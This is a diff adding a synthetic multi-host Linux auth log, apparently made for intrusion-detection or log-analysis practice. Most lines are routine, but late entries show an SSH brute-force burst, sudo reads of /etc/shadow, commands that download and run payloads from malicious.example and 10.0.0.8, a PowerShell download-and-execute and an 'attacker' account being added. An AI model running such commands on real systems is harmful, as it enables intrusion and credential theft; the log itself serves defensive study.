@@ -1,0 +1,263 @@
+Oct 11 20:08:00 laptop-arnold systemd[2013]: Started service for alice
+Oct 11 20:23:00 web-01 CRON[2028]: Started service for alice
+Oct 11 20:36:00 laptop-arnold systemd[2044]: Started service for service
+Oct 11 20:36:00 laptop-arnold CRON[2045]: pam_unix(cron:session): session opened for user bob by (uid=0)
+Oct 11 20:45:00 server-prod CRON[2052]: Started service for charlie
+Oct 11 21:00:00 workstation1 CRON[2062]: Started service for alice
+Oct 11 21:16:00 workstation1 sudo[2076]:   root : TTY=pts/3 ; PWD=/home/root ; USER=root ; COMMAND=/bin/ls
+Oct 11 21:24:00 web-01 sshd[2079]: Failed password for root from 203.0.113.45 port 38394 ssh2
+Oct 11 21:34:00 laptop-arnold sshd[2092]: Accepted password for bob from 192.168.1.10 port 63045 ssh2
+Oct 11 21:43:00 web-01 CRON[2102]: Started service for service
+Oct 11 21:54:00 web-01 sshd[2115]: Failed password for root from 172.16.0.4 port 6861 ssh2
+Oct 11 22:03:00 server-prod sudo[2134]:   bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/ls
+Oct 11 22:10:00 workstation1 systemd[2151]: Started service for charlie
+Oct 11 22:29:00 workstation1 sudo[2153]:   bob : TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Oct 11 22:40:00 web-01 sudo[2160]:   root : TTY=pts/4 ; PWD=/home/root ; USER=root ; COMMAND=/bin/ls
+Oct 11 22:55:00 laptop-arnold sshd[2173]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Oct 11 23:14:00 web-01 sudo[2189]:   charlie : TTY=pts/2 ; PWD=/home/charlie ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 11 23:29:00 server-prod sudo[2200]:   guest : TTY=pts/1 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/ls
+Oct 11 23:49:00 server-prod polkitd[2208]: Started service for guest
+Oct 11 23:58:00 laptop-arnold sudo[2221]:   service : TTY=pts/4 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/systemctl status
+Oct 12 00:15:00 workstation1 systemd[2223]: Started service for bob
+Oct 12 00:21:00 server-prod sshd[2235]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Oct 12 00:36:00 workstation1 sshd[2247]: Accepted password for alice from 198.51.100.23 port 5984 ssh2
+Oct 12 00:42:00 workstation1 sudo[2248]:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/ls
+Oct 12 00:55:00 laptop-arnold sshd[2268]: Failed password for root from 185.199.111.50 port 64879 ssh2
+Oct 12 01:14:00 laptop-arnold sshd[2279]: Accepted password for bob from 198.51.100.22 port 16224 ssh2
+Oct 12 01:19:00 workstation1 sshd[2281]: Failed password for bob from 192.168.1.10 port 24959 ssh2
+Oct 12 01:30:00 laptop-arnold CRON[2289]: Started service for root
+Oct 12 01:47:00 server-prod CRON[2306]: Started service for alice
+Oct 12 02:06:00 server-prod systemd[2321]: Started service for guest
+Oct 12 02:21:00 laptop-arnold systemd[2334]: Started service for bob
+Oct 12 02:39:00 laptop-arnold sshd[2340]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Oct 12 02:59:00 workstation1 systemd[2343]: Started service for guest
+Oct 12 03:07:00 web-01 sshd[2363]: Accepted password for bob from 198.51.100.23 port 2607 ssh2
+Oct 12 03:25:00 server-prod sshd[2368]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Oct 12 03:41:00 workstation1 sshd[2371]: Accepted password for bob from 192.168.1.12 port 48590 ssh2
+Oct 12 03:53:00 server-prod sshd[2375]: Failed password for alice from 198.51.100.23 port 65333 ssh2
+Oct 12 04:08:00 server-prod systemd[2377]: Started service for bob
+Oct 12 04:24:00 server-prod sudo[2383]:   service : TTY=pts/1 ; PWD=/home/service ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Oct 12 04:33:00 server-prod sshd[2397]: Accepted password for charlie from 185.199.111.50 port 63323 ssh2
+Oct 12 04:45:00 web-01 systemd[2414]: Started service for charlie
+Oct 12 04:55:00 server-prod sshd[2415]: Accepted password for root from 10.0.0.5 port 14386 ssh2
+Oct 12 05:02:00 laptop-arnold sshd[2429]: pam_unix(sshd:session): session opened for user charlie by (uid=0)
+Oct 12 05:09:00 web-01 systemd[2434]: Started service for guest
+Oct 12 05:14:00 server-prod polkitd[2451]: Started service for root
+Oct 12 05:19:00 laptop-arnold sshd[2461]: Accepted password for charlie from 198.51.100.23 port 47565 ssh2
+Oct 12 05:24:00 web-01 polkitd[2480]: Started service for bob
+Oct 12 05:39:00 laptop-arnold systemd[2496]: Started service for service
+Oct 12 05:58:00 web-01 systemd[2501]: Started service for charlie
+Oct 12 06:10:00 workstation1 sshd[2516]: Accepted password for service from 203.0.113.46 port 5836 ssh2
+Oct 12 06:26:00 web-01 sudo[2518]:   guest : TTY=pts/3 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/ls
+Oct 12 06:32:00 laptop-arnold sshd[2537]: Failed password for root from 10.0.0.8 port 54237 ssh2
+Oct 12 06:43:00 laptop-arnold polkitd[2542]: Started service for guest
+Oct 12 06:56:00 workstation1 sshd[2544]: Accepted password for root from 10.0.0.8 port 10929 ssh2
+Oct 12 07:16:00 web-01 sshd[2562]: Failed password for guest from 172.16.0.4 port 55297 ssh2
+Oct 12 07:28:00 server-prod sshd[2582]: pam_unix(sshd:session): session opened for user charlie by (uid=0)
+Oct 12 07:37:00 web-01 sudo[2584]:   alice : TTY=pts/3 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 12 07:53:00 workstation1 sshd[2604]: Failed password for bob from 185.199.111.50 port 33588 ssh2
+Oct 12 08:12:00 laptop-arnold CRON[2624]: Started service for bob
+Oct 12 08:31:00 laptop-arnold CRON[2644]: Started service for bob
+Oct 12 08:51:00 laptop-arnold CRON[2648]: Started service for root
+Oct 12 08:57:00 workstation1 sshd[2651]: Accepted password for alice from 203.0.113.45 port 39238 ssh2
+Oct 12 09:04:00 laptop-arnold sshd[2671]: Accepted password for guest from 198.51.100.22 port 61508 ssh2
+Oct 12 09:17:00 laptop-arnold systemd[2682]: Started service for service
+Oct 12 09:28:00 laptop-arnold sshd[2700]: Accepted password for service from 172.16.0.4 port 52526 ssh2
+Oct 12 09:33:00 laptop-arnold sshd[2707]: Failed password for root from 192.0.2.50 port 6878 ssh2
+Oct 12 09:53:00 laptop-arnold sshd[2718]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Oct 12 10:08:00 server-prod systemd[2735]: Started service for alice
+Oct 12 10:16:00 laptop-arnold polkitd[2742]: Started service for service
+Oct 12 10:22:00 workstation1 sudo[2750]:   root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/bin/ls
+Oct 12 10:33:00 workstation1 systemd[2760]: Started service for guest
+Oct 12 10:45:00 laptop-arnold sudo[2777]:   charlie : TTY=pts/3 ; PWD=/home/charlie ; USER=root ; COMMAND=/usr/bin/systemctl status
+Oct 12 11:00:00 server-prod systemd[2794]: Started service for charlie
+Oct 12 11:11:00 workstation1 sshd[2802]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Oct 12 11:21:00 web-01 systemd[2820]: Started service for alice
+Oct 12 11:21:00 web-01 CRON[2821]: pam_unix(cron:session): session opened for user alice by (uid=0)
+Oct 12 11:34:00 workstation1 systemd[2840]: Started service for service
+Oct 12 11:54:00 server-prod sshd[2852]: Failed password for bob from 192.168.1.12 port 38463 ssh2
+Oct 12 12:13:00 server-prod sudo[2871]:   guest : TTY=pts/4 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/ls
+Oct 12 12:22:00 server-prod sshd[2891]: Failed password for alice from 185.199.111.50 port 47610 ssh2
+Oct 12 12:22:00 server-prod CRON[2892]: pam_unix(cron:session): session opened for user alice by (uid=0)
+Oct 12 12:30:00 web-01 sshd[2907]: pam_unix(sshd:session): session opened for user guest by (uid=0)
+Oct 12 12:45:00 laptop-arnold sshd[2918]: Failed password for bob from 10.0.0.5 port 42994 ssh2
+Oct 12 13:01:00 laptop-arnold sshd[2936]: pam_unix(sshd:session): session opened for user service by (uid=0)
+Oct 12 13:08:00 web-01 sshd[2952]: Accepted password for bob from 10.0.0.8 port 40454 ssh2
+Oct 12 13:19:00 web-01 sshd[2959]: Failed password for invalid user charlie from 10.0.0.8 port 32265 ssh2
+Oct 12 13:35:00 server-prod systemd[2975]: Started service for service
+Oct 12 13:48:00 laptop-arnold sudo[2988]:   charlie : TTY=pts/3 ; PWD=/home/charlie ; USER=root ; COMMAND=/usr/bin/systemctl status
+Oct 12 13:55:00 laptop-arnold polkitd[2998]: Started service for service
+Oct 12 14:14:00 server-prod sudo[3014]:   root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/bin/ls
+Oct 12 14:27:00 laptop-arnold sshd[3027]: Accepted password for charlie from 198.51.100.23 port 21544 ssh2
+Oct 12 14:33:00 server-prod sshd[3037]: Failed password for root from 198.51.100.23 port 25848 ssh2
+Oct 12 14:38:00 laptop-arnold CRON[3049]: Started service for bob
+Oct 12 14:54:00 workstation1 CRON[3065]: Started service for guest
+Oct 12 15:07:00 workstation1 systemd[3077]: Started service for root
+Oct 12 15:14:00 workstation1 sshd[3095]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Oct 12 15:29:00 laptop-arnold sshd[3097]: Failed password for invalid user root from 10.0.0.5 port 41040 ssh2
+Oct 12 15:41:00 workstation1 sshd[3104]: Accepted password for charlie from 185.199.111.50 port 38421 ssh2
+Oct 12 15:51:00 server-prod CRON[3120]: Started service for charlie
+Oct 12 16:09:00 web-01 CRON[3123]: Started service for root
+Oct 12 16:25:00 server-prod sshd[3143]: Accepted password for guest from 203.0.113.45 port 42028 ssh2
+Oct 12 16:34:00 laptop-arnold systemd[3156]: Started service for charlie
+Oct 12 16:46:00 server-prod polkitd[3165]: Started service for bob
+Oct 12 16:46:00 server-prod CRON[3166]: pam_unix(cron:session): session opened for user root by (uid=0)
+Oct 12 16:55:00 workstation1 systemd[3172]: Started service for guest
+Oct 12 17:14:00 web-01 sshd[3181]: Accepted password for bob from 10.0.0.5 port 7781 ssh2
+Oct 12 17:34:00 web-01 CRON[3195]: Started service for charlie
+Oct 12 17:44:00 web-01 sshd[3196]: Accepted password for root from 203.0.113.45 port 10234 ssh2
+Oct 12 18:04:00 workstation1 CRON[3216]: Started service for alice
+Oct 12 18:13:00 laptop-arnold sshd[3222]: Failed password for charlie from 10.0.0.5 port 55352 ssh2
+Oct 12 18:21:00 web-01 sshd[3241]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Oct 12 18:41:00 workstation1 sshd[3245]: Failed password for bob from 198.51.100.23 port 8813 ssh2
+Oct 12 18:55:00 laptop-arnold sshd[3249]: pam_unix(sshd:session): session opened for user charlie by (uid=0)
+Oct 12 19:08:00 web-01 CRON[3251]: pam_unix(cron:session): session opened for user alice by (uid=0)
+Oct 12 19:08:00 web-01 sshd[3250]: Accepted password for guest from 198.51.100.22 port 43168 ssh2
+Oct 12 19:16:00 web-01 CRON[3259]: Started service for guest
+Oct 12 19:21:00 workstation1 CRON[3265]: Started service for root
+Oct 12 19:39:00 laptop-arnold sudo[3277]:   service : TTY=pts/0 ; PWD=/home/service ; USER=root ; COMMAND=/usr/bin/systemctl status
+Oct 12 19:55:00 web-01 systemd[3286]: Started service for service
+Oct 12 20:14:00 laptop-arnold sshd[3287]: Accepted password for charlie from 172.16.0.4 port 15626 ssh2
+Oct 12 20:28:00 laptop-arnold CRON[3297]: pam_unix(cron:session): session opened for user root by (uid=0)
+Oct 12 20:28:00 laptop-arnold polkitd[3296]: Started service for alice
+Oct 12 20:36:00 workstation1 sshd[3316]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Oct 12 20:55:00 laptop-arnold sshd[3322]: Accepted password for service from 192.0.2.50 port 58039 ssh2
+Oct 12 21:06:00 workstation1 sshd[3342]: Accepted password for alice from 198.51.100.22 port 56856 ssh2
+Oct 12 21:17:00 server-prod CRON[3349]: Started service for alice
+Oct 12 21:29:00 workstation1 sshd[3359]: Failed password for invalid user service from 185.199.111.50 port 50189 ssh2
+Oct 12 21:41:00 workstation1 sudo[3360]:   root : TTY=pts/4 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl status
+Oct 12 21:47:00 workstation1 sshd[3362]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Oct 12 21:52:00 laptop-arnold sshd[3370]: Failed password for service from 203.0.113.45 port 44274 ssh2
+Oct 12 22:04:00 laptop-arnold sshd[3384]: pam_unix(sshd:session): session opened for user service by (uid=0)
+Oct 12 22:21:00 web-01 polkitd[3391]: Started service for charlie
+Oct 12 22:29:00 server-prod systemd[3400]: Started service for guest
+Oct 12 22:47:00 laptop-arnold sudo[3412]:   root : TTY=pts/2 ; PWD=/home/root ; USER=root ; COMMAND=/bin/ls
+Oct 12 23:05:00 laptop-arnold sshd[3418]: Failed password for invalid user service from 203.0.113.45 port 34920 ssh2
+Oct 12 23:23:00 web-01 sshd[3422]: Failed password for invalid user service from 45.77.34.12 port 49194 ssh2
+Oct 12 23:36:00 laptop-arnold sshd[3438]: Accepted password for service from 192.168.1.10 port 44613 ssh2
+Oct 12 23:50:00 laptop-arnold sshd[3450]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Oct 12 23:59:00 laptop-arnold sshd[3457]: Failed password for alice from 172.16.0.4 port 15970 ssh2
+Oct 13 00:05:00 workstation1 sshd[3463]: Accepted password for guest from 192.168.1.10 port 12004 ssh2
+Oct 13 00:17:00 web-01 CRON[3475]: Started service for bob
+Oct 13 00:26:00 web-01 sshd[3476]: pam_unix(sshd:session): session opened for user charlie by (uid=0)
+Oct 13 00:45:00 workstation1 CRON[3490]: Started service for guest
+Oct 13 00:58:00 workstation1 polkitd[3496]: Started service for guest
+Oct 13 01:14:00 web-01 sshd[3516]: Accepted password for root from 198.51.100.22 port 9913 ssh2
+Oct 13 01:23:00 web-01 sudo[3531]:   root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl status
+Oct 13 01:42:00 web-01 sshd[3542]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Oct 13 01:49:00 workstation1 sshd[3559]: Failed password for root from 203.0.113.45 port 53582 ssh2
+Oct 13 02:06:00 server-prod polkitd[3570]: Started service for service
+Oct 13 02:22:00 server-prod sshd[3577]: Failed password for bob from 203.0.113.46 port 63515 ssh2
+Oct 13 02:39:00 workstation1 sshd[3593]: Accepted password for bob from 45.77.34.12 port 37726 ssh2
+Oct 13 02:57:00 workstation1 sshd[3607]: Accepted password for service from 10.0.0.8 port 13248 ssh2
+Oct 13 03:09:00 laptop-arnold CRON[3610]: Started service for bob
+Oct 13 03:27:00 laptop-arnold sshd[3615]: Failed password for invalid user alice from 45.77.34.12 port 49742 ssh2
+Oct 13 03:36:00 workstation1 systemd[3618]: Started service for service
+Oct 13 03:42:00 web-01 systemd[3629]: Started service for charlie
+Oct 13 03:53:00 server-prod CRON[3647]: Started service for service
+Oct 13 04:06:00 laptop-arnold sshd[3654]: Accepted password for guest from 45.77.34.12 port 40919 ssh2
+Oct 13 04:13:00 workstation1 polkitd[3673]: Started service for alice
+Oct 13 04:19:00 server-prod polkitd[3678]: Started service for service
+Oct 13 04:30:00 workstation1 sshd[3698]: Failed password for guest from 185.199.111.50 port 18790 ssh2
+Oct 13 04:47:00 workstation1 polkitd[3700]: Started service for charlie
+Oct 13 05:05:00 web-01 systemd[3703]: Started service for root
+Oct 13 05:12:00 server-prod polkitd[3705]: Started service for alice
+Oct 13 05:23:00 server-prod sshd[3709]: Accepted password for alice from 45.77.34.12 port 40654 ssh2
+Oct 13 05:35:00 web-01 sshd[3717]: pam_unix(sshd:session): session opened for user charlie by (uid=0)
+Oct 13 05:52:00 server-prod sshd[3723]: Accepted password for alice from 10.0.0.5 port 8944 ssh2
+Oct 13 06:03:00 web-01 CRON[3731]: Started service for bob
+Oct 13 06:09:00 server-prod sshd[3745]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Oct 13 06:19:00 web-01 polkitd[3763]: Started service for root
+Oct 13 06:38:00 web-01 sshd[3764]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Oct 13 06:51:00 workstation1 systemd[3777]: Started service for alice
+Oct 13 07:08:00 laptop-arnold sshd[3797]: Failed password for invalid user guest from 10.0.0.8 port 39495 ssh2
+Oct 13 07:21:00 workstation1 polkitd[3817]: Started service for alice
+Oct 13 07:38:00 laptop-arnold sshd[3833]: Accepted password for root from 10.0.0.5 port 19567 ssh2
+Oct 13 07:44:00 server-prod sshd[3839]: Failed password for invalid user alice from 203.0.113.45 port 59528 ssh2
+Oct 13 08:02:00 server-prod sshd[3848]: Accepted password for charlie from 203.0.113.46 port 27317 ssh2
+Oct 13 08:07:00 server-prod sshd[3857]: Failed password for invalid user service from 203.0.113.46 port 12460 ssh2
+Oct 13 08:12:00 workstation1 CRON[3863]: Started service for guest
+Oct 13 08:17:00 server-prod sshd[3874]: Accepted password for guest from 10.0.0.5 port 22336 ssh2
+Oct 13 08:28:00 web-01 sshd[3878]: Failed password for invalid user bob from 198.51.100.22 port 4277 ssh2
+Oct 13 08:36:00 server-prod sshd[3891]: pam_unix(sshd:session): session opened for user guest by (uid=0)
+Oct 13 08:44:00 laptop-arnold CRON[3911]: Started service for service
+Oct 13 08:59:00 server-prod sshd[3918]: Failed password for root from 172.16.0.4 port 50623 ssh2
+Oct 13 09:14:00 laptop-arnold systemd[3938]: Started service for root
+Oct 13 09:34:00 workstation1 sudo[3942]:   guest : TTY=pts/1 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/ls
+Oct 13 09:44:00 server-prod sshd[3943]: Failed password for invalid user admin from 45.77.34.12 port 40000 ssh2
+Oct 13 09:44:04 server-prod sshd[3944]: Failed password for invalid user admin from 45.77.34.12 port 40001 ssh2
+Oct 13 09:44:04 server-prod sshd[3945]: Failed password for invalid user admin from 45.77.34.12 port 40002 ssh2
+Oct 13 09:44:09 server-prod sshd[3952]: Failed password for invalid user admin from 45.77.34.12 port 40009 ssh2
+Oct 13 09:44:09 server-prod sshd[3946]: Failed password for invalid user admin from 45.77.34.12 port 40003 ssh2
+Oct 13 09:44:13 server-prod sshd[3956]: Failed password for invalid user admin from 45.77.34.12 port 40013 ssh2
+Oct 13 09:44:15 server-prod sshd[3948]: Failed password for invalid user admin from 45.77.34.12 port 40005 ssh2
+Oct 13 09:44:16 server-prod sshd[3947]: Failed password for invalid user admin from 45.77.34.12 port 40004 ssh2
+Oct 13 09:44:25 server-prod sshd[3968]: Failed password for invalid user admin from 45.77.34.12 port 40025 ssh2
+Oct 13 09:44:28 server-prod sshd[3957]: Failed password for invalid user admin from 45.77.34.12 port 40014 ssh2
+Oct 13 09:44:30 server-prod sshd[3953]: Failed password for invalid user admin from 45.77.34.12 port 40010 ssh2
+Oct 13 09:44:32 server-prod sshd[3959]: Failed password for invalid user admin from 45.77.34.12 port 40016 ssh2
+Oct 13 09:44:36 server-prod sshd[3961]: Failed password for invalid user admin from 45.77.34.12 port 40018 ssh2
+Oct 13 09:44:42 server-prod sshd[3949]: Failed password for invalid user admin from 45.77.34.12 port 40006 ssh2
+Oct 13 09:44:52 server-prod sshd[3969]: Failed password for invalid user admin from 45.77.34.12 port 40026 ssh2
+Oct 13 09:44:56 server-prod sshd[3950]: Failed password for invalid user admin from 45.77.34.12 port 40007 ssh2
+Oct 13 09:45:04 server-prod sshd[3951]: Failed password for invalid user admin from 45.77.34.12 port 40008 ssh2
+Oct 13 09:45:06 server-prod sshd[3954]: Failed password for invalid user admin from 45.77.34.12 port 40011 ssh2
+Oct 13 09:45:15 server-prod sshd[3958]: Failed password for invalid user admin from 45.77.34.12 port 40015 ssh2
+Oct 13 09:45:21 server-prod sshd[3970]: Failed password for invalid user admin from 45.77.34.12 port 40027 ssh2
+Oct 13 09:45:27 server-prod sshd[3972]: Failed password for invalid user admin from 45.77.34.12 port 40029 ssh2
+Oct 13 09:45:36 server-prod sshd[3955]: Failed password for invalid user admin from 45.77.34.12 port 40012 ssh2
+Oct 13 09:45:40 server-prod sshd[3963]: Failed password for invalid user admin from 45.77.34.12 port 40020 ssh2
+Oct 13 09:45:52 server-prod sshd[3971]: Failed password for invalid user admin from 45.77.34.12 port 40028 ssh2
+Oct 13 09:45:54 server-prod sshd[3962]: Failed password for invalid user admin from 45.77.34.12 port 40019 ssh2
+Oct 13 09:45:55 server-prod sshd[3966]: Failed password for invalid user admin from 45.77.34.12 port 40023 ssh2
+Oct 13 09:46:12 server-prod sshd[3965]: Failed password for invalid user admin from 45.77.34.12 port 40022 ssh2
+Oct 13 09:46:16 server-prod sshd[3960]: Failed password for invalid user admin from 45.77.34.12 port 40017 ssh2
+Oct 13 09:46:48 server-prod sshd[3964]: Failed password for invalid user admin from 45.77.34.12 port 40021 ssh2
+Oct 13 09:47:12 server-prod sshd[3967]: Failed password for invalid user admin from 45.77.34.12 port 40024 ssh2
+Oct 13 09:59:00 web-01 sshd[3973]: Accepted password for guest from 198.51.100.22 port 52341 ssh2
+Oct 13 09:59:12 web-01 sudo[3974]:   guest : TTY=pts/3 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/bash -c curl http://malicious.example/payload -o /tmp/payload.sh
+Oct 13 09:59:19 web-01 sudo[3975]:   guest : TTY=pts/3 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/bash /tmp/payload.sh
+Oct 13 09:59:24 web-01 sudo[3976]:   guest : TTY=pts/3 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/ps1')"
+Oct 13 10:03:00 laptop-arnold sshd[3980]: Failed password for root from 10.0.0.5 port 48513 ssh2
+Oct 13 10:12:00 server-prod sshd[3990]: Failed password for alice from 192.168.1.12 port 9579 ssh2
+Oct 13 10:29:24 workstation1 sudo[3977]:   alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/net user attacker /add
+Oct 13 10:34:00 laptop-arnold sshd[3992]: Accepted password for alice from 192.0.2.50 port 28055 ssh2
+Oct 13 10:49:00 server-prod sshd[3995]: Accepted password for guest from 192.168.1.10 port 24626 ssh2
+Oct 13 10:52:00 laptop-arnold sshd[4004]: Accepted password for bob from 203.0.113.46 port 54184 ssh2
+Oct 13 11:02:00 web-01 sshd[4014]: Failed password for guest from 10.0.0.8 port 59208 ssh2
+Oct 13 11:10:00 web-01 sshd[4017]: Failed password for charlie from 203.0.113.45 port 5340 ssh2
+Oct 13 11:39:00 server-prod sshd[4025]: Failed password for bob from 45.77.34.12 port 43369 ssh2
+Oct 13 11:54:00 laptop-arnold sshd[4033]: Failed password for alice from 203.0.113.45 port 48745 ssh2
+Oct 13 12:21:00 workstation1 sshd[4036]: Failed password for service from 198.51.100.22 port 64454 ssh2
+Oct 13 12:31:00 workstation1 sshd[4043]: Accepted password for root from 45.77.34.12 port 2025 ssh2
+Oct 13 12:48:00 server-prod sshd[4044]: Failed password for service from 192.0.2.50 port 4857 ssh2
+Oct 13 13:05:00 workstation1 sshd[4046]: Accepted password for charlie from 192.0.2.50 port 8610 ssh2
+Oct 13 13:08:00 server-prod sshd[4054]: Accepted password for guest from 172.16.0.4 port 10265 ssh2
+Oct 13 13:18:00 web-01 sshd[4057]: Accepted password for alice from 198.51.100.23 port 62660 ssh2
+Oct 13 13:30:00 web-01 sshd[4060]: Failed password for charlie from 192.0.2.50 port 4917 ssh2
+Oct 13 13:34:00 laptop-arnold sshd[4062]: Accepted password for charlie from 198.51.100.23 port 16245 ssh2
+Oct 13 13:55:00 web-01 sshd[4066]: Accepted password for charlie from 203.0.113.46 port 60197 ssh2
+Oct 13 14:17:00 workstation1 sshd[4070]: Failed password for service from 10.0.0.8 port 25334 ssh2
+Oct 13 14:24:00 laptop-arnold sshd[4080]: Failed password for root from 10.0.0.5 port 48894 ssh2
+Oct 13 14:46:00 laptop-arnold sshd[4085]: Accepted password for bob from 192.0.2.50 port 1562 ssh2
+Oct 13 14:48:00 laptop-arnold sshd[4088]: Accepted password for guest from 10.0.0.8 port 46158 ssh2
+Oct 13 14:51:00 web-01 sshd[4089]: Accepted password for alice from 185.199.111.50 port 5969 ssh2
+Oct 13 15:01:00 laptop-arnold sshd[4091]: Accepted password for root from 192.168.1.12 port 61370 ssh2
+Oct 13 15:03:00 workstation1 sshd[4096]: Accepted password for root from 192.168.1.10 port 34126 ssh2
+Oct 13 15:05:00 workstation1 sshd[4098]: Accepted password for charlie from 10.0.0.8 port 64118 ssh2
+Oct 13 15:31:00 web-01 sshd[4107]: Accepted password for root from 45.77.34.12 port 8657 ssh2
+Oct 13 15:46:00 laptop-arnold sshd[4115]: Accepted password for bob from 203.0.113.46 port 40754 ssh2
+Oct 13 15:58:00 web-01 sshd[4118]: Accepted password for charlie from 203.0.113.46 port 26657 ssh2
+Oct 13 16:01:00 web-01 sshd[4126]: Failed password for root from 172.16.0.4 port 48888 ssh2
+Oct 13 16:11:00 workstation1 sshd[4131]: Accepted password for root from 192.0.2.50 port 53550 ssh2
+Oct 13 16:37:00 web-01 sshd[4134]: Accepted password for charlie from 198.51.100.23 port 65331 ssh2
+Oct 13 16:48:00 server-prod sshd[4135]: Accepted password for guest from 45.77.34.12 port 53868 ssh2
+Oct 13 17:00:00 workstation1 sshd[4145]: Failed password for bob from 185.199.111.50 port 46675 ssh2
+Oct 13 17:09:00 server-prod sshd[4155]: Accepted password for bob from 198.51.100.22 port 53772 ssh2
+Oct 13 17:22:00 workstation1 sshd[4161]: Accepted password for guest from 198.51.100.22 port 61893 ssh2
+Oct 13 17:34:00 server-prod sshd[4171]: Failed password for alice from 10.0.0.8 port 43563 ssh2
+Oct 13 17:46:00 workstation1 sshd[4178]: Accepted password for guest from 10.0.0.8 port 63886 ssh2
+Oct 13 17:58:00 server-prod sshd[4181]: Failed password for service from 192.168.1.12 port 16934 ssh2
+Oct 13 18:09:00 workstation1 sshd[4188]: Accepted password for bob from 203.0.113.46 port 47317 ssh2
+Oct 13 18:24:00 laptop-arnold sudo[4189]:   bob : TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash -c "wget http://10.0.0.8/shell -O /tmp/shell"
+Oct 13 18:24:20 laptop-arnold sudo[4190]:   bob : TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash /tmp/shell
